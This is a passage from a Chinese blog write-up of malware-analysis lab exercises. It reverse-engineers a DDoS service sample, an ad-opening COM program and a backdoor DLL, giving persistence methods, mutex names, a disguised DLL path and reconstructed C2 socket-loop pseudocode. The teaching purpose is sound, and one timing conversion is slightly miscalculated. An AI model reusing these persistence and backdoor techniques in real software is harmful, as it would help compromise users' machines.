<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111164421458.png" alt="image-20230111164421458"></p>
<p><code>arg_0</code>是函数最后 <code>push</code> 进栈的参数，也就是 <code>var_C</code> 的值，<code>var_C</code> 的值代表了函数已经循环的次数。</p>
<p>由此可见，该程序相比前三个程序新的网络迹象就是可变的 <code>user-agent</code>。</p>
<h2 id="六、Lab7-分析"><a href="#六、Lab7-分析" class="headerlink" title="六、Lab7 分析"></a>六、<code>Lab7</code> 分析</h2><h3 id="6-1-Lab7-01-分析"><a href="#6-1-Lab7-01-分析" class="headerlink" title="6.1 Lab7-01 分析"></a>6.1 <code>Lab7-01</code> 分析</h3><h4 id="6-1-1-扫描实验文件"><a href="#6-1-1-扫描实验文件" class="headerlink" title="6.1.1 扫描实验文件"></a>6.1.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111164850466.png" alt="image-20230111164850466"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="6-1-2-检查文件是否被加壳"><a href="#6-1-2-检查文件是否被加壳" class="headerlink" title="6.1.2 检查文件是否被加壳"></a>6.1.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111164919567.png" alt="image-20230111164919567"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="6-1-3-查看程序的导入表和字符串"><a href="#6-1-3-查看程序的导入表和字符串" class="headerlink" title="6.1.3 查看程序的导入表和字符串"></a>6.1.3 查看程序的导入表和字符串</h4><p>查看程序的导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165449015.png" alt="image-20230111165449015"></p>
<p><code>CreateServiceA</code> 和 <code>OpenSCManagerA</code> 函数表明创建服务，以确保该程序可以随系统运行。而 <code>StartServiceCtrlDispatcherA</code> 函数被系统用于实现服务，且一般立即被调用。该函数制定了服务控制管理器会调用的函数。</p>
<p>再使用 <code>IDA</code> 软件观察该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165759195.png" alt="image-20230111165759195"></p>
<p>可以看到，程序存在一个 <code>MalService</code>，可以推测该程序创建了一个系统服务，网址信息为<code>http://www.malwareanalysisbook.com</code>，用户代理信息为<code>Internet Explorer 8.0</code> 。</p>
<h4 id="6-1-4-程序分析"><a href="#6-1-4-程序分析" class="headerlink" title="6.1.4 程序分析"></a>6.1.4 程序分析</h4><p>我们分析<code>StartServiceCtrlDispatcherA</code> 函数制定的服务控制管理器会调用的函数如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111170755493.png" alt="image-20230111170755493"></p>
<p>可以看到，它所制定的函数是 <code>sub_401040</code>。检查<code>sub_401040</code>函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111170840209.png" alt="image-20230111170840209"></p>
<p>第一个函数是<code>OpenMutexA</code>，它尝试获取一个名为”<code>HGL345</code>“的互斥量句柄。如果调用成功，程序就会退出。</p>
<p>下一个调用是 <code>loc_401064</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111170956096.png" alt="image-20230111170956096"></p>
<p>可以看到，其创建名为 <code>HGL345</code> 的互斥量，两处组合调用，用于保证同一时间这个程序只有一份实例在运行。因为如果有一个实例在运行了，则 <code>OpenMutexA</code> 第一次调用成功，程序就会退出。</p>
<p><code>OpenSCManagerA</code> 打开服务控制管理器句柄，以便该程序可以添加或修改服务；<code>GetModuleFileNameA</code> 返回当前可执行程序或一个被加载 <code>DLL</code> 的全路径名，返回的全路径名被 <code>CreateServiceA</code> 用于创建一个新的服务。</p>
<p>下面是关于时间的函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111171256189.png" alt="image-20230111171256189"></p>
<p><code>834h</code> 表示10进制 <code>2100</code>，表示2100年1月1日午夜，而 <code>SystemTimeToFileTime</code> 用于不同时间格式的转换。</p>
<p>再接下来是 <code>SetWaitableTimer</code> 函数的 <code>lpDueTime</code> 参数，它来自于刚才时间转换函数返回的 <code>FileTime</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111171414053.png" alt="image-20230111171414053"></p>
<p>随后进入 <code>WaitForSingleObject</code> 等待，直到2100年1月1日午夜执行：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111171444081.png" alt="image-20230111171444081"></p>
<p>查看该参数 <code>StartAddress</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111171631276.png" alt="image-20230111171631276"></p>
<p>循环末尾的 <code>jmp</code> 指令是一个无条件跳转，意味着代码将永远不会停止；调用 <code>InternetOpenUrlA</code>，并且一直下载该网址的主页。由于前面 <code>ESI</code> 被设置为20，因此会有20个线程一直调用 <code>InternetOpenUrlA</code> 函数。</p>
<p>该恶意代码的目的是将自己在多台机器上安装成一个服务，进而启动 <code>DDOS</code> 攻击；如果所有的被感染机器在同一时间访问该服务器，会导致该服务器过载并无法访问该站点，导致拒绝服务攻击。</p>
<p>综合以上分析，可以发现程序执行的是一个定时任务：时间为<code>2100年1月1日半夜</code>，发送大量请求到<code>http://www.malwareanalysisbook.com</code>引发 <code>DDOS</code> 攻击。</p>
<h3 id="6-2-Lab7-02-分析"><a href="#6-2-Lab7-02-分析" class="headerlink" title="6.2 Lab7-02 分析"></a>6.2 <code>Lab7-02</code> 分析</h3><h4 id="6-2-1-扫描实验文件"><a href="#6-2-1-扫描实验文件" class="headerlink" title="6.2.1 扫描实验文件"></a>6.2.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165026574.png" alt="image-20230111165026574"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="6-2-2-检查加壳情况与进行准备工作"><a href="#6-2-2-检查加壳情况与进行准备工作" class="headerlink" title="6.2.2 检查加壳情况与进行准备工作"></a>6.2.2 检查加壳情况与进行准备工作</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165044919.png" alt="image-20230111165044919"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<p>用 <code>IDA</code> 软件查看该程序的字符串如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172144375.png" alt="image-20230111172144375"></p>
<p>信息较少，我们查看导入函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172435659.png" alt="image-20230111172435659"></p>
<p>和 <code>COM</code> 对象有关。<code>CoCreateInstance</code> 和 <code>OleInitialize</code> 函数使用 <code>COM</code> 功能。</p>
<h4 id="6-2-3-程序分析"><a href="#6-2-3-程序分析" class="headerlink" title="6.2.3 程序分析"></a>6.2.3 程序分析</h4><p>我们实际运行该程序：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172620259.png" alt="image-20230111172620259"></p>
<p>直接点运行之后，就会跳出一个窗口，然后就开始连接 <code>www.malwareanalysisbook.com</code> 网址。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172729500.png" alt="image-20230111172729500"></p>
<p>我们发现，运行程序后，系统注册表删除了一个键，并新建了四个键。</p>
<p>我们推测，这里是将这个<code>Default HTML Editor</code>设置成了<code>Internet Explorer</code>，然后便是增加了一个<code>\Toolbar\WebBrowser</code>，是浏览器的工具栏的位置，<code>MenuOrder\Favorites</code> 是收藏夹。</p>
<p>我们使用 <code>IDA</code> 进行程序分析，首先看 <code>main</code> 函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111172927552.png" alt="image-20230111172927552"></p>
<p>程序一开始是先调用了 <code>OleInitialize</code> 这个函数，该函数的作用是初始化 <code>COM</code>，然后便是一个判断 <code>jl</code> 跳转，其实就是判断两种情况。</p>
<p>然后我们看看这个函数 <code>OleInitialize</code> 返回值在 <code>MSDN</code> 中的定义是这样的</p>
<ul>
<li><p>如果调用成功，返回 <code>S_OK</code>，<code>S_OK=0</code></p>
</li>
<li><p>如果调用失败，返回 <code>S_FALSE</code>，<code>S_FALSE==1</code></p>
</li>
</ul>
<p>其他错误返回特定的错误类型，一般这些错误都是小于0的</p>
<p>所以这个 <code>jl</code> 语句的意思就是，如果返回的是除了 <code>S_OK</code> 和 <code>S_FALSE</code> 之外的错误，就直接跳转退出程序。</p>
<p>结合程序流程图，当没有跳转时，执行以下代码：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173206816.png" alt="image-20230111173206816"></p>
<p>在这里，<code>IDA</code> 将这个 <code>CoCreateInstance</code> 函数的返回 <code>COM</code> 对象标记为了<code>ppv</code>。为了确定这个程序是调用了哪个<code>COM</code>对象，我们应查看 <code>riid</code>和 <code>rclsid</code> 分别对应哪个功能：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173330291.png" alt="image-20230111173330291"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173347733.png" alt="image-20230111173347733"></p>
<p>通过打开注册表编辑器可以看到，<code>CLSID</code>在注册表中的具体位置在 <code>HKLM\SOFTWARE\Classes\CLSID\</code> 。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173450965.png" alt="image-20230111173450965"></p>
<p>第一个数是<code>2DF01h</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173532982.png" alt="image-20230111173532982"></p>
<p>我们可以找到这个值的位置，点 <code>LocalServer32</code> 就会发现这个 <code>CLSID</code> 会调用什么函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173559591.png" alt="image-20230111173559591"></p>
<p>这里的数据显示的是<code>&quot;C:\Program Files\Internet Explorer\iexplore.exe&quot;</code>，也就是 <code>IE</code> 浏览器的可执行文件所在位置。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111173655573.png" alt="image-20230111173655573"></p>
<p>综合以上分析，我们得到程序的功能：若创建<code>COM</code>对象成功，便开始调用以上代码，也即通过调用这个 <code>COM</code> 对象，将参数（网址）传进去，然后便是打开目的地址为 <code>http://www.malwareanalysisbook.com/ad.html</code> 的 <code>IE</code> 窗口。</p>
<h3 id="6-3-Lab7-03-分析"><a href="#6-3-Lab7-03-分析" class="headerlink" title="6.3 Lab7-03 分析"></a>6.3 <code>Lab7-03</code> 分析</h3><h4 id="6-3-1-扫描实验文件"><a href="#6-3-1-扫描实验文件" class="headerlink" title="6.3.1 扫描实验文件"></a>6.3.1 扫描实验文件</h4><p>使用<a target="_blank" rel="noopener" href="https://www.virscan.org/">VirScan - 多引擎文件在线检测平台</a>扫描实验文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165144301.png" alt="image-20230111165144301"></p>
<p>从扫描结果来看，可以确认该文件是病毒文件。</p>
<h4 id="6-3-2-检查文件是否被加壳"><a href="#6-3-2-检查文件是否被加壳" class="headerlink" title="6.3.2 检查文件是否被加壳"></a>6.3.2 检查文件是否被加壳</h4><p>我们使用 <code>PEiD</code> 软件进行检查文件是否被加壳，这里有两个文件，包括 <code>exe</code> 和 <code>dll</code>：</p>
<p><code>exe</code> 文件结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111180638476.png" alt="image-20230111180638476"></p>
<p><code>dll</code> 文件结果如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111165205896.png" alt="image-20230111165205896"></p>
<p>可以看到，该程序未加壳，是用 <code>Microsoft Visual C++ 6.0</code> 编写的。</p>
<h4 id="6-3-3-查看程序的导入表和字符串"><a href="#6-3-3-查看程序的导入表和字符串" class="headerlink" title="6.3.3 查看程序的导入表和字符串"></a>6.3.3 查看程序的导入表和字符串</h4><p>查看程序的导入表。首先看 <code>exe</code> 文件：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111180746735.png" alt="image-20230111180746735"></p>
<p>我们发现，这里有一个 <code>CreateFileA</code> 和 <code>CopyFileA</code> 这两个函数，说明会创建一个文件和复制一个文件，创建文件可能会是日志等文件，复制文件可能是把病毒复制到某个地方。</p>
<p>然后是 <code>FindFirstFileA</code> 和 <code>FindNextFileA</code> 两个函数，说明这个函数会在系统中查找什么文件；</p>
<p>然后是 <code>CreateFileMappingA</code> 和 <code>MapViewOfFile</code> 两个函数，这个程序会打开一个文件，然后将它映射到内存中。</p>
<p>但是，在导入表中我们并没有发现 <code>LoadLibrary</code> 或者 <code>GetProcAddress</code>，说明这个函数并没有在运行的时候加载这个 <code>DLL</code>。</p>
<p>再使用 <code>IDA</code> 软件观察该程序的字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111181258288.png" alt="image-20230111181258288"></p>
<p>这里指示了一个路径 <code>C:\\windows\\system32\\kerne132.dll</code>。</p>
<p>再来分析 <code>dll</code> 文件，查看其导入表：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111221613905.png" alt="image-20230111221613905"></p>
<p>这个 <code>dll</code> 文件会创建和打开一个互斥变量，也就是这个函数 <code>CreateMutexA</code> 和 <code>OpenMutexA</code>，然后还会创建进程 <code>CreateProcessA</code> 这个函数，最后调用<code>Sleep</code>函数来休眠。</p>
<p>查看其字符串：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111221801387.png" alt="image-20230111221801387"></p>
<p>推测该程序是个后门程序，<code>127.26.152.13</code>的<code>ip</code> 可能是个后门木马。</p>
<h4 id="6-3-4-dll-文件程序分析"><a href="#6-3-4-dll-文件程序分析" class="headerlink" title="6.3.4 dll 文件程序分析"></a>6.3.4 <code>dll</code> 文件程序分析</h4><p>从 <code>DllMain</code> 开始分析：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111221932869.png" alt="image-20230111221932869"></p>
<p>一开始调用了 <code>__alloca_probe</code> 函数，这个函数是用来在空间中分配栈空间的函数，然后这个函数的入参是 <code>11F8h</code> 也就是 <code>4600d</code>，<code>IDA</code> 将 <code>fdwReason</code> 的值赋值给了 <code>eax</code>，这里的 <code>[esp+11F8h+fdwReason]</code> 说明已经将 <code>[esp+11F8h]</code>这个地方分配出去了；</p>
<p>最后我们将返回值和 <code>1</code> 比较大小，如果不等于 <code>1</code> 呢，则下面的 <code>jnz</code> 跳转执行，<code>jnz</code> 跳转之后就马上执行了返回，所以这个代码是希望这个 <code>eax</code> 也就是 <code>fdwReason</code> 是等于 <code>1</code> 的。</p>
<p>然后我们继续分析主干：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222200506.png" alt="image-20230111222200506"></p>
<p>这里我们是先将 <code>byte_10026054</code> 赋值给<code>al</code>。我们来看 <code>byte_10026054</code> 代表的字符串的含义：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222237250.png" alt="image-20230111222237250"></p>
<p><code>db</code>是申请一个字节然后，后面的<code>0</code>代表了存储的数据。将 <code>al</code> 也就是 <code>0</code> 存入 <code>[esp+1208h+buf]</code> 的位置之后，将 <code>eax</code> 置为 <code>0</code>，然后用 <code>OpenMutexA</code> 打开了一个叫 <code>SADFHUHF</code>的互斥量，然后查看调用结果，如果结果 <code>eax</code> 为 <code>0</code>了，<code>jnz</code> 不跳转，反之如果不为 <code>0</code>，<code>jnz</code>跳转。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222422426.png" alt="image-20230111222422426"></p>
<p><code>MSDN</code>里面写明了这个<code>OpenMutexA</code>的返回值，逻辑上归纳一下就是，如果调用失败，返回 <code>NULL</code>，在计算机中也就是 <code>0</code>，<code>jnz</code> 不会跳转，继续执行代码，反之如果调用成功，则 <code>jnz</code> 跳转，跳转之后我们顺着箭头可以看到是结束执行了。</p>
<p>所以，这是判断当前系统中是否有相同程序的作用，一个系统中只能运行一个这个程序。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222604368.png" alt="image-20230111222604368"></p>
<p>如果 <code>OpenMutexA</code> 调用失败，执行上面这段代码，也就是没跳转之后执行的代码。这里是调用<code>CreateMutexA</code>来创建一个叫 <code>SADFHUHF</code> 互斥量，然后在调用 <code>WSAStartup</code> 这个函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222655669.png" alt="image-20230111222655669"></p>
<p>这个函数是 <code>Windows</code> 异步套接字启动命令，从 <code>MSDN</code> 中我们可以分析这个函数入参有哪些：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222728458.png" alt="image-20230111222728458"></p>
<p>从 <code>IDA</code> 的标注中我们也可以证明上述函数的入参：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111222750732.png" alt="image-20230111222750732"></p>
<p><code>wVersionRequested</code> 的调用者可以使用的最高版本的 <code>Windows Sockets</code> 规范，高位字节指定次要版本号，低位字节指定主版本号。</p>
<p>根据这个入参 <code>202h</code> 换算成二进制就是 <code>‭0000,0010,0000,0010‬</code>，分成高字节和低字节之后就是 <code>(00000010, 00000010)</code> ，也即 <code>(2.2)</code>，所以这里指定的套接字版本是 <code>2.2</code>。</p>
<p><code>lpWSAData</code> 是指向 <code>WSADATA</code> 数据结构的指针，用于接收 <code>Windows Sockets</code> 实现的详细信息，如果成功了，返回<code>0</code>。</p>
<p>逻辑上总结一下就是，<code>WSAStartup</code>之后，返回值经过那个 <code>test</code> 之后，如果成功，返回 <code>0</code>，然后 <code>jnz</code> 不跳转，反之如果不成功，跳转结束程序。</p>
<p>假设调用成功了，程序就会来到这里执行：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111223239562.png" alt="image-20230111223239562"></p>
<p>这里是初始话了一个 <code>TCP</code> 的 <code>INET</code> 连接，然后将返回值赋值给 <code>esi</code>，之后和 <code>0,FFFF,FFFFh</code> 进行比较</p>
<p>我们联想到有符号数的概念， <code>0,FFFF,FFFFh</code> 值有可能是个负值。根据计算方法，先将这个赋值减1，然后计算反码，然后在将非符号位转换成十进制，即 <code>FFFF,FFFF-1=FFFF,FFFE</code>。</p>
<p>然后除了符号位之外，全部取反码，最后就是 <code>1000,0000,0000,0000,0000,0000,0000,0001</code>，最后换算成十进制就是 <code>-1d</code>。</p>
<p>如果返回值大于 <code>-1d</code> 的话，<code>jnz</code> 跳转，<code>jz</code> 不跳转。</p>
<p>逻辑上归纳一下就是，如果返回值大于 <code>-1d</code>，函数继续执行，不跳转；反之返回值小于等于 <code>-1d</code> 的话，<code>jz</code> 跳转，之后就是做一些清理工作就退出程序了。</p>
<p>假设函数没有跳转，之后便会执行这些函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111223521403.png" alt="image-20230111223521403"></p>
<p><code>msdn</code> 中 <code>connect</code> 函数定义如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111223553999.png" alt="image-20230111223553999"></p>
<p><code>s</code> 的值是 <code>esi</code>，<code>name</code> 的值是 <code>edx</code>，<code>namelen</code> 的值是 <code>10h</code>。这里的 <code>namelen</code> 好理解，<code>10h</code> 换算成十进制也是 <code>10d</code>，其他的 <code>s</code> 的 <code>esi</code> 代表的是刚刚我们 <code>WSAStartup</code> 初始话之后保存在 <code>esi</code> 栈中的套接字。</p>
<p>然后就是 <code>edx</code> 的值，结合上面的代码，我们会发现，其实 <code>edx</code> 指向的就是 <code>127.26.152.13:80</code>。</p>
<p>当然，这个时候已经不是 <code>127.26.152.13:80</code> 这个值了，经过 <code>hton</code> 一系列变化之后已经从主机(<code>Host</code>)序转换成网络(<code>Network</code>)序了。注意调用 <code>hton</code> 之前 <code>push</code> 进栈的 <code>50h</code>，这个是端口号，然后网络序是计算机在网络上通信使用的底层编码，我们知道这个值代表了这个 <code>IP</code> 和端口就够了。</p>
<p>该函数的返回值定义如下：如果没有错误，就返回 <code>0</code>。</p>
<p>假设程序返回值是<code>0</code>，然后继续分析主干代码：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111223909294.png" alt="image-20230111223909294"></p>
<p>这里是将 <code>ebp</code> 存储 <code>strncmp</code> 函数的位置，其实就是指向 <code>strncmp</code> 函数的一个指针；<code>ebx</code>也是同样的道理，是指向 <code>CreateProcessA</code> 的指针。</p>
<p>这里没有跳转，继续往下执行，下面就是：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111223951808.png" alt="image-20230111223951808"></p>
<p>可以看出来，只有有一个 <code>1</code>，最后的结算结果就是 <code>1</code>，而我们运算的第二个因子是 <code>FFFF,FFFFh</code>，所以分析可知，这个 <code>or</code> 运算的目的是将 <code>ecx</code> 全部置 <code>1</code>，将 <code>eax</code> 全部置<code>0</code>。</p>
<p>之后最主要的就是调用了 <code>send</code> 函数，这里最主要的是将 <code>buf</code> 里面的值 <code>hello</code> 发送出去，该函数返回的是发送的字节数。</p>
<p>然后我们依旧假设 <code>send</code> 没有报错，我们就会来到这里：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111224143309.png" alt="image-20230111224143309"></p>
<p>这里调用了 <code>shutdown</code> 函数，该函数的入参是 <code>esi</code> 和 <code>1</code>。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111224313224.png" alt="image-20230111224313224"></p>
<p>该函数的作用是关闭这个 <code>socket</code> 连接。</p>
<p>然后也是比较返回值，如果调用失败，跳转结束函数；如果函数调用成功，则执行以下代码：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111224401319.png" alt="image-20230111224401319"></p>
<p>我们阅读 <code>recv</code>的 <code>MSDN</code> 说明后可知，函数是返回接受的字节数，如果数据已经传输完毕，然后没有接受到数据(<code>eax</code>=<code>0</code>)，或者报错的时候(<code>eax</code>&lt;<code>0</code>)，<code>JLE</code> 就会跳转。</p>
<p>这时候，函数就会跳回这个代码片段以前的地方重复执行。然后有会重新发送一个 <code>hello</code> 出去，然后关闭连接，接收一个回执，如果接收失败又跳回去发送 <code>hello</code>。</p>
<p>这个代码片段可以用以下C语言代码来描述：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">iResult <span class="token operator">=</span> <span class="token function">send</span><span class="token punctuation">(</span> ConnectSocket<span class="token punctuation">,</span> sendbuf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span>sendbuf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 以下是发送失败跳转处理函数</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>iResult <span class="token operator">==</span> SOCKET_ERROR<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//printf("send failed: %d\n", WSAGetLastError());</span>
    <span class="token function">closesocket</span><span class="token punctuation">(</span>ConnectSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">WSACleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//printf("Bytes Sent: %ld\n", iResult);</span>

<span class="token comment">// shutdown the connection since no more data will be sent</span>
<span class="token comment">// 关闭连接</span>
iResult <span class="token operator">=</span> <span class="token function">shutdown</span><span class="token punctuation">(</span>ConnectSocket<span class="token punctuation">,</span> SD_SEND<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>iResult <span class="token operator">==</span> SOCKET_ERROR<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">//printf("shutdown failed: %d\n", WSAGetLastError());</span>
    <span class="token function">closesocket</span><span class="token punctuation">(</span>ConnectSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">WSACleanup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 循环发送</span>
<span class="token comment">// 接受数据失败跳转</span>
<span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
    iResult <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>ConnectSocket<span class="token punctuation">,</span> recvbuf<span class="token punctuation">,</span> recvbuflen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> iResult <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token comment">//printf("Bytes received: %d\n", iResult);</span>
        <span class="token function">do_something</span><span class="token punctuation">(</span>iResult<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> iResult <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Connection closed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv failed: %d\n"</span><span class="token punctuation">,</span> <span class="token function">WSAGetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span> iResult <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们依旧假设我们接受数据成功了，接下来就会处理这个代码片段：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111224622024.png" alt="image-20230111224622024"></p>
<p><code>msdn</code> 中的说明如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>
   <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>string1<span class="token punctuation">,</span>
   <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>string2<span class="token punctuation">,</span>
   <span class="token class-name">size_t</span> count
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据以前的知识，可以从汇编代码中得出以下C语言伪代码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> <span class="token keyword">char</span> string1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"sleep"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>string2 <span class="token operator">=</span> buf<span class="token punctuation">;</span> 			<span class="token comment">//buf是从recv获得的数据</span>
<span class="token class-name">size_t</span> count <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>

<span class="token function">strncmp</span><span class="token punctuation">(</span>string1<span class="token punctuation">,</span> string2<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>strncmp</code> 函数会比较前 <code>count</code> 个字符串相等或不相等，我们这里的 <code>count</code> 是等于 5，所以也就是 <code>sleep</code> 这个字符串的长度，它会比较接受的字符串是不是 <code>sleep</code>；</p>
<p>然后 <code>test</code> 一下 <code>eax</code> 的值是不是为0，然后如果不为 0 了的话，<code>jnz</code> 跳转。</p>
<p>逻辑上归纳一下就是，如果接收的字符串是 <code>sleep</code> 的话，函数跳转到左边的地方执行，也就是调用 <code>sleep</code> 函数来是进程休眠，休眠的时间是 <code>6,0000h</code> 也就是‭ <code>393216‬dms</code> ，约等于 <code>6.053min</code>。</p>
